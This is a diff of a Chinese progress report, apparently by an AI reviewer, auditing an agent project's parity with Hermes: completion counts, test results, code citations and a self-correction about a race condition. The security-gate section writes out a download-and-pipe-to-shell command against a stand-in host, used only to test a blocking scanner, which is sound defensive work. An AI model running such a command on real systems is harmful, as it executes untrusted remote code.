@@ -1,230 +1,238 @@
 # 对标进度报告
 
-**更新时间**：2026-10-28 11:20（本机实测时钟，只读取证）
-**本轮轮次**：**N = 7**
-**性质**：只读核对。未修改任何代码 / research / MATRIX / ROADMAP 文件；未装依赖；未启动后端；未跑会改状态或真发请求的命令（`config edit` / `doctor --fix` / `--live` / `cron run` / `gateway start` / `backup restore` 全部未运行）。
-**基准**：Hermes Agent runtime 0.21.0-cn.18 · **目标仓**：Orbit `E:\bbbooottt`（HEAD `b5457c9`，**工作树干净** ✅）
+**更新时间**：2026-10-28 12:05（本机实测时钟，只读取证）
+**本轮轮次**：**N = 8**
+**性质**：只读核对。未修改任何代码 / research / MATRIX / ROADMAP 文件；未装依赖；未启动后端；未跑会改状态或真发请求的命令。
+**基准**：Hermes Agent runtime 0.21.0-cn.18 · **目标仓**：Orbit `E:\bbbooottt`（HEAD `5c7d534`；**轮初工作树干净，轮末出现 4 个未跟踪新文件，见 R1**）
 
 ---
 
 ## 总体完成度
 
-### **97 / 181 项 = 53.6%**
-
-> ⚠️ **与表头的 54.1% 差 1 条，原因是计数工具的口径 bug，不是你在虚报。详见风险 R1。**
+### **112 / 181 项 = 61.9%**
 
 | 项 | 说明 |
 |---|---|
-| 权威口径 | **读表格的「状态」列**（第 5 个 `\|` 段），不是整行扫符号 |
-| 完成 | **✅ 97 条** |
-| 部分 | 🟡 **45 条** |
-| 未开始 | ⬜ **39 条** |
-| 合计 | 181（编号唯一 181/181） |
-| 表头 / `matrix_stats.py` 口径 | ✅98 / 🟡44 / ⬜39 = **54.1%** ← **多了 1 条**，见 R1 |
+| 权威口径 | **读「状态」列**（第 5 个 `\|` 段），且**先替换转义竖线 `\|` 再切段** |
+| 完成 / 部分 / 未开始 | **✅ 112 · 🟡 45 · ⬜ 24**（112+45+24 = 181 ✓ **总数对得上**） |
+| 与 `matrix_stats --check` 一致性 | 工具输出「181 项 · ✅112 · 🟡45 · ⬜24（61.9%）」exit 0 —— **与我独立解析逐字一致** ✅ |
+| 格式合法性 | 我另跑一遍校验：**181 行状态列全部合法**，且**没有任何一行出现第二个状态符号**（上轮 10.1 的污染已清除） |
 
-**差异的唯一来源**：`MATRIX 10.1` 的状态列是 **🟡**，但它的证据栏里含我上轮建议的措辞「→ **变 ✅ 的路径**」。`scripts/matrix_stats.py::count()` 用的是 `if DONE in line`（**整行包含即算完成**），于是把这条 🟡 算成了 ✅。
+> **上轮我报的两个缺陷，你这轮修得比我的建议更彻底**：
+> 1. `status_of()` 现在**先替掉 `\|` 再切段**（`matrix_stats.py:52-53`）——这正是 **5.9 / 5.10 被静默漏掉**的根因（`iwr\|iex` 把状态列右移一格读成 `'W13'`）。我上轮只发现了"整行包含"那一层，**没发现转义竖线这第二层**；你能抓出来是对的。
+> 2. `status_column_problems()`（`:76`）实现了两条门禁，docstring 还**逐字记录了我的措辞如何污染了 10.1**（`:17-18`）。这是把教训写进代码而不是写进聊天记录——比修 bug 本身更有价值。
 
-**修正后：97 / 45 / 39 = 53.6%**；本轮真实新增 ✅ = **14 条**（表头显示 15 条）。
-
-### 硬口径：**全部对上**
+### 硬口径
 
 | 你的口径 | 我的实测 | 判定 |
 |---|---|---|
-| `REGISTRY` 80 顶层 / 345 二级 / 39 三级 = 464 | **80 / 345 / 39 = 464** | ✅ 一致 |
-| done 219 / partial 18 / todo 227 | **219 / 18 / 227** | ✅ 一致 |
-| pytest 1 failed, 1760 passed, 1 skipped | **1 failed / 1760 passed / 1 skipped（153.74s）** | ✅ 一致（你 145.08s） |
-| ruff `All checks passed!` | **All checks passed!**（exit 0） | ✅ 一致 |
-| mypy 103 source files | **103 source files** | ✅ 一致 |
-| 工作树干净 | `git status --porcelain` 空 | ✅ 一致 |
+| `REGISTRY` 81 顶层 / 364 二级 / 39 三级 = 484 | **81 / 364 / 39 = 484** | ✅ 一致 |
+| done 255 / partial 22 / todo 207 | **255 / 22 / 207**（合计 484 ✓） | ✅ 一致 |
+| pytest 1 failed, 2043 passed, 1 skipped | **1 failed / 2043 passed / 1 skipped（191.15s）** | ✅ 一致（你 183.24s） |
 | 唯一失败 = 既有 `test_connectors::test_browser_append_and_reload` | 正是它 | ✅ 一致 |
-| MATRIX ✅98 / 🟡44 / ⬜39（54.1%） | **97 / 45 / 39（53.6%）** | ⚠️ **差 1 条（R1）** |
+| ruff `All checks passed!` | **All checks passed!**（exit 0） | ✅ 一致 |
+| `matrix_stats --check` 181 · ✅112 · 🟡45 · ⬜24 exit 0 | **完全一致**，exit 0 | ✅ 一致 |
+| mypy **120** files clean | **122 files，2 errors**（都在 `metrics_schema.py`） | ⚠️ **见 R1：差异来自轮中落地的未跟踪文件，已提交树仍 clean** |
 
 ---
 
 ## 分层完成度
 
-（状态列口径）
+（状态列口径，转义竖线已处理）
 
 | 层 | 完成/总数 | 百分比 | 状态 |
 |---|---|---|---|
-| L1 入口 / CLI | 10 / 18 | 55.6% | 进行中（🟡4） |
-| L2 Agent 核心循环 | 1 / 10 | 10.0% | **最弱层**（🟡3，⬜6） |
-| **L3 上下文装配** | **8 / 8** | **100%** | **🎉 首个整层对齐** |
-| L4 模型适配 | 6 / 13 | 46.2% | 本轮 +5（🟡3，⬜4） |
-| L5 工具层 | 11 / 19 | 57.9% | 本轮 +3（🟡4，⬜4） |
-| L6 工具集 / 注册 | 3 / 5 | 60.0% | 进行中（🟡2） |
-| L7 Skill / curator | 9 / 18 | 50.0% | 进行中（🟡5，⬜4） |
-| L8 MCP | 6 / 10 | 60.0% | 进行中（🟡2，⬜2） |
-| L9 记忆层 | 8 / 16 | 50.0% | 本轮 +3（🟡3，⬜5） |
-| L10 持久化 / 会话 | 5 / 15 | 33.3% | 🟡5、⬜5 |
-| L11 cron | 3 / 6 | 50.0% | 进行中（🟡2） |
-| L12 Gateway / 多平台 | 7 / 11 | 63.6% | 进行中（🟡3） |
-| L13 插件 | 5 / 10 | 50.0% | 进行中（🟡4） |
-| L14 安全 / 审批 | 6 / 10 | 60.0% | 🟡4 |
+| L1 入口 / CLI | 10 / 18 | 55.6% | 🟡5、⬜3 |
+| **L2 Agent 核心循环** | **6 / 10** | **60.0%** | **本轮从 ✅1 → ✅6**（🟡3、⬜1） |
+| **L3 上下文装配** | **8 / 8** | **100%** | **✅ 仍完整，未被本轮改动破坏** |
+| L4 模型适配 | 6 / 13 | 46.2% | 🟡4、⬜3 |
+| L5 工具层 | 13 / 19 | 68.4% | 本轮 +2（🟡4、⬜2） |
+| L6 工具集 / 注册 | 3 / 5 | 60.0% | 🟡2 |
+| L7 Skill / curator | 13 / 18 | 72.2% | 本轮 +4（🟡3、⬜2） |
+| L8 MCP | 6 / 10 | 60.0% | 🟡2、⬜2 |
+| L9 记忆层 | 8 / 16 | 50.0% | 🟡3、⬜5 ← **剩余最大块** |
+| L10 持久化 / 会话 | 9 / 15 | 60.0% | 本轮 +4（🟡5、⬜1） |
+| L11 cron | 3 / 6 | 50.0% | 🟡2、⬜1 |
+| L12 Gateway / 多平台 | 7 / 11 | 63.6% | 🟡3、⬜1 |
+| L13 插件 | 5 / 10 | 50.0% | 🟡4、⬜1 |
+| L14 安全 / 审批 | 6 / 10 | 60.0% | 🟡4、⬜0 |
 | L15 可观测性 | 4 / 6 | 66.7% | ⬜2 |
-| L16 Web UI / 前端 | 5 / 6 | 83.3% | 本轮 +1（16.1） |
-| **合计** | **97 / 181** | **53.6%** | — |
+| L16 Web UI / 前端 | 5 / 6 | 83.3% | 🟡1 |
+| **合计** | **112 / 181** | **61.9%** | — |
 
-**L3 上下文装配 8/8 = 100%** —— 这是项目开跑以来**第一个整层对齐的层**，值得单独记一笔。
+**L3 = 8/8 = 100% 仍完整** ✅（你让我顺手确认的那条：未破坏）。
+**L2 从 10% → 60%**，是本轮涨幅最大的一层，也是我上轮建议的直接结果。
 
 ---
 
 ## 本轮抽查证据
 
-**抽样率**：本轮新增 14 条 ✅ 中**复核 12 条（86%）**；你点名的 4 条 🟡 **全部复核**；`errors.py` 处置 **独立复核**。
+**抽样率**：本轮 15 条转 ✅ 中**复核 11 条（73%）**；两处披露 **全部复核**；`test_graph` 竞态更正 **独立复现**。
 
-### A. 你点名的 7 条，逐条判定 —— **7/7 全部撑得住**
+### A. 你点名的 7 条，逐条判定
 
-**① 4.5 / 4.6「已接线」→ ✅✅ 真接线，且测试确实走 `get_model` + 假 factory**
+**① 10.12 双 FTS5 → ✅✅ 独立库、不动 schema、选表策略与代码一致**
 
-`app/agent.py` 里裸名 `FallbackChain` 命中 1（在 docstring），`CredentialPool` 命中 1；但**真正的接线走 `fb.` 前缀**（`from app import fallback as fb`）：
 ```
-agent.py:476   def get_model(...)                       ← 返回 RoutedModel，不是裸客户端
-agent.py:503       route = _route_of(candidate, len(plan.attempts) - 1)
-agent.py:504       self.last_route = route
-agent.py:512       return RoutedModel(plan, client, route, on_switch=self._on_route_switch)
-agent.py:514   def _on_route_switch(self, route):      ← 切换时写 last_route + log.warning
-agent.py:519   def _targets(self) -> list[fb.FallbackTarget]:   ← 主模型 + fallback_chain
-agent.py:526       primary = fb.FallbackTarget(...)
-agent.py:552       pool = fb.CredentialPool(fb.KeyringStore(f"orbit:{...}"))
-agent.py:166       raise fb.FallbackExhausted(self._plan.attempts) from exc
+session_index.py:1     """会话检索的双 FTS5 索引：独立 ``fts.sqlite``，中文与英文各走一条路。"""
+session_index.py:15-16 1. 在 app.sqlite 里加 FTS5 虚表 + 触发器 → **改 schema，禁改区**；
+                       2. 另开 <data_dir>/fts.sqlite，由本模块**主动**增量同步。
+session_index.py:79    #: 索引库文件名（与 app.sqlite 同级，但**完全独立**）。
+session_index.py:439   """丢掉索引库重来一遍（**不动 app.sqlite**）。"""
+session_index.py:277   "删掉它不会丢任何消息，消息真相源在 app.sqlite"
 ```
-`Route`（`agent.py:28`）字段与你说的完全一致：`provider / model / base_url / key_label / attempt / reason`，`to_dict()` 额外给 `switched = attempt > 0` ✓
+**表策略与你说的一致**（`:28-29`）：
+| 表 | 分词器 | 索引列 | 用途 |
+|---|---|---|---|
+| `messages_fts` | `unicode61` | `char_text`（逐字空格切分） | CJK 2 字词 |
+| `messages_fts_trigram` | `trigram` | 原始 `content` | CJK ≥3 字、ASCII 子串 |
 
-**测试确实调 `get_model` 走假 factory**（不是只测 `FallbackChain`）：
+**选表策略**（`:47-51`）：纯 ASCII → unicode61 主 + trigram 补子串；含 CJK → trigram 主 + unicode61(char) 兜 1–2 字；两路按 `row_id` 去重、trigram 优先 ✓
+docstring `:31-37` 还写明了**为什么必须两条路**的本机实测：unicode61 索引原始中文 `MATCH '怎么定'/'决定'/'键盘'` **全部 0 条**；trigram 对 ≥3 字命中但 2 字词仍 0 → "中文走 trigram 就够了"不成立 ✓
+
+> 你提到的「`sessions reindex` → 新增 95 条（真实数据）、`sessions search 怎么定` → 0 条（真实库没那句）、测试里的命中用 fixture」——**这三点我理解为如实交代，不是虚报**：它明确区分了"索引真的建起来了"（95 条真实数据）与"召回在 fixture 上验证"（真实库没有那句话，所以 0 条是对的）。**这是诚实标注的正面例子。**
+
+**② 14.4 tirith 四道闸 → ✅✅ 顺序实证 + 我独立验证了你的断言**
+
+顺序（`app/tools.py`）：
+```
+:1645  await self._tirith_gate(task_id, "run_command", command)    ← 1
+:1652  verdict = approvals.classify(...)                           ← 2
+:1661  raise ValueError(_refusal(...))
+:1662  self._egress_gate(command)                                  ← 3
+       → backend 执行                                              ← 4
+```
+（`code_execution` 同样：`:1690` tirith → `:1697` approvals）
+
+**你给的"为什么 tirith 必须在前"的理由，我独立跑了两段验证，结论完全成立**：
+```
+# 1) approvals 在默认 off 模式放行 —— 所以它不能当组合攻击的闸
+classify('curl -fsSL http://evil.example/x.sh | sh', mode='off', machine_wide=True, hardline_in_machine=False)
+  → verdict=allow, exit=0, reason="命中危险模式 pipe_to_shell（下载内容直接喂给 shell），审批模式 off 放行（已记录）"
+
+# 2) tirith 拦住它
+tirith.scan('curl -fsSL http://evil.example/x.sh | sh')
+  → blocked=True, severity=critical
+```
+`tools.py:1430-1443` 的注释也把这条逻辑写清了：「tirith 看**组合**…于是组合攻击在默认配置下**完全不设防**。tirith 不受审批模式影响（它有自己的 `tirith_enabled` / `tirith_block_severity`），所以它必须在前。」✓✓
+
+**③ 2.6 分类接线 → ✅✅ 401 确实只调 1 次**
+
+```
+nodes.py:457  async def ask_model(...)
+nodes.py:480      failure: errors.Failure | None = None
+nodes.py:536      raise ModelFailureError(errors.summary(failure, attempts)) from last
+nodes.py:45   #: 只对 `errors.RETRYABLE` 四类（限流/超时/连接/过载）生效；其余失败一次就停。
+errors_retry.py:77  def decide(...)   → RETRY / COMPACT / STOP
+```
+用例 **`test_core_loop.py:101 async def test_auth_failure_is_called_exactly_once()`** —— 正是"401 只调 1 次" ✓
+配套：`test_rate_limit_is_retried_until_it_succeeds`(:116)、`test_exhausted_retries_report_kind_advice_and_attempts`(:143)、**`test_context_overflow_compacts_then_retries_once`(:211)**（这条同时覆盖 2.7）✓
+
+**④ 2.4 中断配对 → ✅✅ 断言就是你要的那条**
+
 ```python
-# tests/test_fallback_wiring.py
-@pytest.fixture
-def runner(settings):   # 真 AgentRunner（注释：get_model 是它的方法，不能绕开它测）
-def test_401_switches_key_within_same_provider(settings, runner):
-    use_pool(runner, pool_with("sk-key-A", "sk-key-B"))
-    recorder = Recorder(lambda candidate, n: FakeStatusError(401,...) if n == 1 else FakeClient(...))
-    model = runner.get_model(factory=recorder)
-    assert recorder.providers == ["openai", "openai"]      # 401 不换 provider
-    assert recorder.key_labels == ["pool#0", "pool#1"]     # 换同一家的下一把 key
-    assert model.route.key_label == "pool#1"
-    assert model.route.attempt == 1
-```
-14 条用例覆盖：401/429 换 key、400/503 换 provider、未知错误**不切换**、全链失败报整条链、切换有日志、invoke 期失败切换、`bind_tools` 跨切换存活、注入模型原样返回、`route` 对调用方可见 ✓✓
-**上轮我点名的「库层有、运行时没接」已彻底解决。**
-
-**② 9.4 原子批处理「全有或全无」→ ✅✅ 补偿回滚真被验证**
-
-```python
-# app/memory_batch.py
-:269  async def apply_batch(...)     """原子批处理：按最终态校验，全有或全无。"""
-:279      （故意在第 N 次写失败，验证补偿真的把状态退回批处理前）
-:300      log.warning("批处理写入失败，开始补偿：%s", exc)
-:302      await engine.restore(before, created)
-:139  async def restore(self, before, created):   """补偿写：改过的 key 写回旧值，新建的 key 删掉。…补偿必须**幂等**"""
-```
-**你要的那个「先真写一半再抛」的后端在**：`test_apply_batch_rolls_back_when_write_fails`(:184) 用 `_FlakyBackend(store)`，断言链：
-```python
-assert result.ok is False
-assert result.wrote is True          # 真的写进去了（写了一半）
-assert result.rolled_back is True    # 然后补偿了
-assert "已回滚" in result.error
-assert await _entries(store) == {"k1": "v1"}   # 旧值回来了、新建的 k9 没留下
-```
-**这是真补偿验证，不是"函数被调用过"。** ✓✓
-
-**③ 9.5 熔断 → ✅✅ 确实在数调用次数**
-
-```python
-async def test_guarded_consolidation_stops_calling_when_tripped(tmp_path):
-    """熔断期间"不再尝试"必须是**不调用**，所以数调用次数。"""
+async def test_interrupted_execute_still_returns_one_result_per_call():   # test_core_loop.py:284
+    """中断的**唯一**合法出口是"每个调用都给一条结果"——不是抛异常、不是跳过。"""
     ...
-    for _ in range(3): ...        assert calls["n"] == 3
-    # 第 4、5 次：熔断已打开，worker 一次都不该被调用
-    for _ in range(2): ...        assert calls["n"] == 3      ← 仍是 3
-    await consolidate_guarded(..., turn="t2", ...)            assert calls["n"] == 4   ← 下一轮恢复
+    # 核心不变量：tool_calls 条数 == ToolMessage 条数。
+    assert tool_calls == len(tool_messages) == 2
+    assert retry.missing_tool_results(merged) == []
 ```
-**正是你要的「3 次失败后第 4、5 次仍为 3」** ✓；常量 `_MAX_CONSOLIDATION_FAILURES_PER_TURN = 3`（`memory_batch.py:58`）。
+✓✓ 精确命中。配套 `test_repair_fills_missing_tool_results`(:271)、`test_interrupted_result_has_the_documented_shape`(:264)、`test_interrupted_thread_does_not_call_the_model_again`(:311)。
 
-**④ 5.12 `todo` 落盘 + 重启 → ✅✅ 用例在**
+**⑤ 5.17 code_execution 子进程 → ✅✅ 断言 `os.getpid()`**
 
-`test_meta_tools.py:76 async def test_todo_state_survives_a_restart(env)` ✓ —— 就是"重启后还在"。
-另有 `test_todo_add_list_and_reads_back_the_full_list`(:61)（回读）、上限 50 条(:110)、单条 200 字符(:123)。常量 `TODO_MAX_ITEMS = 50` / `TODO_MAX_CHARS = 200` / `TODO_STATUSES = (pending, in_progress, done)`（`tools.py:305-308`）✓
-
-**⑤ 5.16 apply_patch 原子性 → ✅✅ 用例正是那个形状**
-
-`test_patch.py:189 def test_context_mismatch_writes_nothing_at_all(tmp_path)` ✓ —— 「第 2 个 hunk 不匹配 → 第 1 个 hunk 也没写」。
-配套还有 `test_mismatch_names_the_hunk_and_the_line`(:210)、`test_apply_is_idempotent_on_a_second_run`(:233)、`test_path_escape_is_rejected`(:247)、`test_the_same_file_twice_in_one_patch_is_rejected`(:286)，共 22 条。
-
-**⑥ 3.8 注入扫描只包高风险来源 → ✅✅ `memory_search` 确实不被包**
-
+```
+code_exec.py:125  return [sys.executable, "-c", code]
+code_exec.py:178  process = subprocess.Popen(  # noqa: S603 - argv 是显式列表，不经 shell
+```
+用例 **`test_code_exec.py:42 test_code_never_runs_in_the_host_process`**：
 ```python
-# app/tools.py（as_tool_text）
-:1851  from app import redact, untrusted
-:1859  if untrusted.is_high_risk(source):
-:1860      findings = untrusted.scan(text)
-:1871      return untrusted.wrap(source, text)
-
-# app/untrusted.py
-:50  HIGH_RISK_TOOLS = frozenset({"run_command", "local_read_document", "web_search", "web_extract"})
-:53  HIGH_RISK_PREFIXES = ("browser_",)
-:48  # 反过来，``memory_search`` / ``skill_load`` / ``history_*`` **不在**名单里：它们读的…
+result = code_exec.run_code("import os; print(os.getpid(), flush=True); os._exit(0)")
+assert int(result.stdout.strip()) != os.getpid()
 ```
-用例：`test_high_risk_sources_are_wrapped`(:117) + `test_low_risk_sources_are_not_wrapped`(:127) + `test_redaction_still_happens_inside_the_wrapper`(:147) ✓✓
+✓✓（比"pid 不变"更强：子进程 pid 与宿主**不同**，且子进程里 `os._exit` 不会带走宿主）
+配套 `test_timeout_kills_the_whole_process_tree`(:103)、`test_execute_goes_through_tirith`(:196)、`test_execute_goes_through_the_hardline_approvals`(:183)。
 
-**⑦ 16.1 dashboard 18 页 → ✅✅ 测试现场读 `main.py` 抽路由，不是硬编码**
+**⑥ 10.5 内容寻址 → ⚠️ 机制 ✅ / 那个数字 ❌ 复现不出来（你的怀疑是对的）**
 
-实跑 `dashboard.report()`：
+**机制部分完全成立**：`PromptStore` 在 `app/session_archive.py:256`（不是 `system_prompts.py`）：
 ```
-total: 18 | covered: 4 | partial: 11 | missing: 3 | unbacked: {}
+:257  """``system_prompts`` 的 Orbit 版：``sha256`` → 文件，任务只记 hash。"""
+:282  """存一份提示词正文，返回 sha256。**同一内容只落一份文件**。"""
+:290  digest = hashlib.sha256(data).hexdigest()
+:45   read 时重算 sha256，不符就抛 PromptMismatch
 ```
-**与 MATRIX 的 4 / 11 / 3 完全一致，且 `unbacked` 为空** ✓
-测试确实是现场读文件：
-```python
-test_dashboard.py:45  MAIN_PY = Path(__file__).resolve().parents[1] / "app" / "main.py"
-test_dashboard.py:6-7 「…`app/main.py` 一改，测试还绿着，面板就开始撒谎。所以这里凡是涉及路由的断言，
-                       都现场 read_text 读 app/main.py 再比对。」
-:121  test_main_py_route_extraction_actually_works   ← 断言 len(routes) >= 25，防正则写坏
-:146  test_no_page_claims_a_route_that_main_py_does_not_have  ← report()["unbacked"] 必须空
-```
-**这是本轮质量最高的一条证据设计**：连"正则本身写坏了"都有自检。
+`session_plane.py:71-72` 也有对应的事件记账说明 ✓
 
-### B. 你刻意标的 4 条 🟡 —— **四条都标得准**
+**但「本机 Hermes 数据实测：27 会话 → 22 份，894,988 → 717,973 字节，省 5 份 / 177,015 字节」我复现不出来。**
+我用**只读**方式（`mode=ro&immutable=1`）直接查本机 Hermes 的 `state.db`：
 
-| 条目 | 实测 | 判定 |
+| 指标 | MATRIX 写的 | 我实测 |
 |---|---|---|
-| **4.9** 辅助槽位 | `aux_slots.SLOTS = ('summary','title','compression','classifier')` = **4** 个（Hermes 18 个） | ✅ 🟡 正确 |
-| **5.13** clarify 的 gateway 按钮 | `grep send_buttons` 于 `tools.py` / `graph/nodes.py` / `gateway.py` = **0 命中** → clarify 确实没走按钮渲染，只渲染文本 | ✅ 🟡 正确 |
-| **9.10** 外部 provider | `PROVIDER_NAMES` = **8**（local/file/jsonl + mem0/zep/letta/chroma/pgvector）；真实现 3 个；其余 `available()` **恒 False**（`:99,103,231,234,349`）；读写抛 `ProviderUnavailable` | ✅ 🟡 正确（**但见 R3 的命名问题**） |
-| **16.1** 3 页无数据源 | `missing: 3` 实测 = 3，`partial: 11` | ✅ 🟡 正确 |
+| 有 system_prompt 的会话 | 27 | **64** |
+| 去重后唯一提示词 | 22 | **46** |
+| 逐会话合计 | 894,988 字节 | **2,505,095 字节** |
+| 去重后 | 717,973 字节 | **1,858,947 字节** |
+| 省下 | 5 份 / 177,015 字节 | **18 份 / 646,148 字节** |
 
-### C. `errors.py` 撤回的处置 —— **我判断：撤回是对的**
+（该数字**算术自洽**：894,988 − 717,973 = 177,015、27 − 22 = 5，所以不是随手编的；但**与现库不符**——可能是子agent 用了某个更窄的口径（比如只看带 hash 列的、或某个时间窗），而那个口径没写下来。）
 
-先说复核结果（你交代的三点全部属实）：
+**判定：这个数字目前不构成独立证据。** 建议三选一：① 把子agent 用的确切查询写进证据栏；② 直接换成可复现的 646,148 / 18 份；③ **删掉数字、只留机制**——机制那半是代码可查的，本来就不需要这个数字撑。
 
-| 你的说法 | 实测 |
+**⑦ L7 的 7.6 / 7.12 / 7.14 / 7.17 → ✅✅ 四条全部精确**
+
+| 条目 | 实测 |
 |---|---|
-| 只保留分类层 | `errors.py`：`ADVICE` 13 类 / `RETRYABLE` 4 类 / `is_context_overflow()` 存在 ✓ |
-| 21 条测试 | `pytest tests/test_errors.py --collect-only` = **21 tests** ✓ |
-| 未接线 | `grep errors` 于 `app/graph/nodes.py` = **0**，`app/agent.py` = **0** ✓ |
-| 撤回后 test_graph 恢复绿 | `pytest tests/test_graph.py -q` = **24 passed in 10.73s** ✓ |
+| **7.6** 12 条规则 | `skill_lint.RULES` = **12**，severity 分布 **`{'error': 2, 'warning': 10}`** ✓✓ 正是 2 ERROR + 10 WARNING |
+| **7.12** quarantine | `skill_hub.py:35`「放行条件写死为**零 critical**（`GUARD_CRITICAL`）。high/medium 只记录」；`:37-38`「`release()` **不能绕过 critical**（重扫一次，仍 critical 就仍然拒绝）」✓✓ |
+| **7.14** bundles | `bundles.py`：`Bundle`(:68) / `Bundles`(:119) / `ReloadReport`(:109) / `BundlesError`(:59) —— 真实现，不是空登记 ✓ |
+| **7.17** journey | `journey.py:29`「（旁注 + 墓碑标记），**绝不回写 `.usage.json` 或 ledger**」；`:36`「`.usage.json` 与 ledger **一个字节都不动**」✓✓ |
 
-**为什么"撤回"比"留着红树等对方"更对（4 条理由）**：
+### B. 你的两处主动交代 —— 都复核成立
 
-1. **绿树是多方共享的公共资产。** 这是并行多 agent 施工；一棵红树会让**所有人**都失去"这次失败是不是我弄的"这个判据——你这轮就正好撞上了这个困境（分不清是自己接线还是别人重写 `agent.py`）。留着红树等于把不确定性扩散给每一个并行的 agent。
-2. **归因必须先隔离成单变量。** 正确顺序是「等 `agent.py` 稳定 → 单独接线 → 跑 test_graph」。撤回把接线变成一个**可重放的干净实验**；留着红树则永远无法归因。
-3. **MATRIX 的标注方式正是诚实优先要的做法。** 2.6/2.7 标 🟡 并写明「**未接线**：`Nodes.ask_model` 仍对所有异常重试 `MODEL_ATTEMPTS` 次——那一轮 `app/agent.py` 正被另一个子agent 重写，同时改会互相覆盖」。**把不确定性写进文档而不是藏起来**，这比"接上了但不知道为什么红"好一个数量级。
-4. **沉没成本没浪费。** 分类层 + 21 条测试留在库里，接线只需把 `ask_model` 的 except 分支改成 `errors.classify(exc)` → 只有 `RETRYABLE` 才重试。成本已经付了，只差一行调用。
+**① `session_extra` 导入顺序 → ✅ 你的表述与 `__init__.py` 现状完全一致**
 
-**唯一建议补充**：在 2.6/2.7 的证据栏加一句**接线点**（`Nodes.ask_model` 的 except 分支 → `errors.classify` → 仅 `RETRYABLE` 重试），否则下一个人接手时要重新推导一遍。
+`app/cli/commands/__init__.py` 现在是三组：
+```python
+from app.cli.commands import (...)          # isort: split   ← 第一组：真实现，含 setup
+# ── 第二组：**必须在表组装之后**导入的模块 ──
+from app.cli.commands import (
+    hermes_parity,   # noqa: F401
+    session_extra,   # noqa: E402,F401
+)
+from app.cli.commands.tools_extra2 import mark_proxy_paths_partial  # noqa: E402
+```
+注释里**逐字写着你的规则**：「**替换顶层命令的模块必须排在 `hermes_parity` 之前；只往已有父节点挂子命令的模块可以排在之后**。这是唯一一个"之后"的例子。」
+**行为验证**：`setup` 正常注册（`handler=run_setup`、`subcommands=0`、`state=done`），**没有** `命令重复登记：setup` —— 我这一整轮跑的每一条 `orbit` 命令都没报这个错，说明 CLI 起得来 ✓
 
-**反过来说，"留着红树"只在两个条件同时成立时才更优**：能即时协调 + 红树存活以分钟计。本轮明显不成立。
+**② `egress` 6 条被校正为 `partial` → ✅ 精确对上**
 
-### D. 其余新增 ✅ 抽查（3 条）
+`orbit egress` 共 13 子命令，实测状态：
+| partial（6 条，iron-proxy 生命周期） | done（7 条） |
+|---|---|
+| `install` `start` `stop` `restart` `reload` `disable` | `setup` `status` `config` `policy` `allow` `deny` `check` |
 
-| 条目 | 证据 | 判定 |
-|---|---|---|
-| **4.3** per-model 路由 | `app/model_router.py::route()` 实跑：`gpt-5.4`→openai ✓、`deepseek-chat`→deepseek ✓、`totally-unknown-model`→`supported=False` + 「不在任何 provider 的模型表里」**不猜** ✓；`test_model_router.py` 28 条 | ✅ |
-| **4.4** 推理翻译表 | `reasoning.py`：`Translator` 类 + 逐家请求构造 `_deepseek_request` / `_zai_request` / `_kimi_request` + `_ANTHROPIC_BUDGET` + `NotSupported` | ✅ |
-| **4.11** MoA | `moa.py`：`Proposer` / `MoAPlan` / `Proposal` / `MoAResult` / `per_slot_cap` / `build_aggregator_prompt`（N proposer + 1 aggregator） | ✅ |
-| **5.3** check_fn 探针 | `toolsets.py:313 PROBE_TTL_SECONDS = 30.0`、`:316 PROBE_GRACE_SECONDS = 60.0`、`_PROBE_CACHE`、三步逻辑（新鲜即返回 / 失败在宽限内判抖动 / 超宽限才摘） | ✅ |
+`__init__.py` 里那段状态校正的注释也把理由写清了：「只是'如实报告 Orbit 没有这一层'，功能本身没实现。但 `Spec.build()` 见到有 handler 就标 `done`，于是'如实说没有'被算成'有'。」✓✓
 
-> **未复核的 2 条**：9.15（`orbit memory`）、14.6 / 14.10 其中之一。如实标注。
+> **你点出的这类虚报值得单独立一条规矩**：「**如实说没有 ≠ 有**」。它比"没做却说做了"更隐蔽，因为命令确实有输出、exit code 也可能是 0。**我下轮开始会专门抽查这一类**：凡是 `done` 的命令，都要看它的输出是"真的做了"还是"解释为什么没做"。
+
+### C. `test_graph` 竞态更正 —— **我第 3–7 轮的判断是错的，本轮更正**
+
+`app/agent.py` 里现在有明确记录：
+```
+:324  async def enqueue(self, task_id: str, resume: dict | None = None):
+:327      为什么不能直接 `return`（原来的写法）：任务进入 `WAITING_USER` 时，状态…
+:330      此时 `task_id in self.current` 仍为真，那次 enqueue 会被**静默丢弃**：
+:332      （`tests/test_graph.py::test_ask_user_still_interrupts_and_resumes` 偶发挂死）。
+:339      deferred = asyncio.create_task(self._enqueue_after(job, task_id, resume))
+:351  async def _enqueue_after(self, job, task_id, resume):   → await self.enqueue(...)
+```
+**代码注释直接点名了那条用例**，修复是"延后到当前 job 结束后再 enqueue"。
+
+**独立复现**：我把该用例隔离连跑 3 次 → **1 passed in 4.21s / 3.73s / 3.16s**，全部通过，且比第 6 轮我测到的 5.70s 更快。
+
+**更正记录**：我在第 3 / 5 / 6 / 7 轮反复把 `test_ask_user_still_interrupts_and_resumes` 的偶发挂死记为「**负载敏感、非回归**」。**这个判断是错的**——它是 `WAITING_USER` 窗口内 `enqueue` 静默丢弃 resume 的**竞态**。我当时依据的是"隔离跑必过"，但**竞态同样会表现为"隔离跑必过、并发跑偶发挂"**，所以"隔离通过"不能用来排除竞态。这是我这 8 轮里最实质的一次误判，已在本报告更正。
 
 ---
 
@@ -234,72 +242,61 @@ test_dashboard.py:6-7 「…`app/main.py` 一改，测试还绿着，面板就�
 
 | # | 未完成项 | 现状 | 量级 |
 |---|---|---|---|
-| 1 | **L2 核心循环（6 ⬜ + 3 🟡）** | 唯一"几乎没动"的层：13 类错误分类**未接线**、`context_overflow` 压缩重试**未接线**、心跳判卡死、中断配对、后台学习回路 | 9 条待补 |
-| 2 | **L10 持久化（5 ⬜ + 5 🟡）** | 归档不删、`system_prompts` 内容寻址、存活租约、双 FTS、`hosted_room_*` 事件溯源；🟡 里 10.1 写侧未统一、10.4 压缩阈值未接 | 10 条待补 |
-| 3 | **L7 Skill 剩余（4 ⬜ + 5 🟡）** | hub 分发、bundles、sync 三方合并、`skills_guard` 107 条威胁模式、curator 剩 8 子命令 | 9 条待补 |
-| 4 | **L1 入口（4 ⬜ + 4 🟡）** | `serve` / `dashboard` / `desktop` / `gui` / `acp` / TUI / 全局 23 flag | 8 条待补 |
-| 5 | **L9 记忆剩余（5 ⬜ + 3 🟡）** | USER.md 用量自曝头、8 个外部 provider（`available()` 恒 False）、holographic、写入门禁、漂移防护、CJK FTS | 8 条待补 |
